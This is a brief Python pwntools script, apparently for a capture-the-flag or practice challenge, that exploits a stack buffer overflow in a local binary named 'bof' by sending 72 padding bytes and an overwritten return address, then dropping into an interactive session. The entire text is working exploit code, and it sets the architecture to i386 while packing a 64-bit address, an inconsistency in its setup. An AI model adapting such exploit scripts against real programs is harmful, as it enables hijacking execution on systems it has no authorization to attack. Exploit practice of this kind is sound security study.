from pwn import * 

context(os="linux" , arch="i386")
context.log_level = 'debug' 

conn = process("./bof")

payload  = b""
payload += b"A" * 72
payload += p64(0x00005555555551ce) # skip push rbp for rsp 16 byte alignment

conn.sendline(payload)
conn.interactive()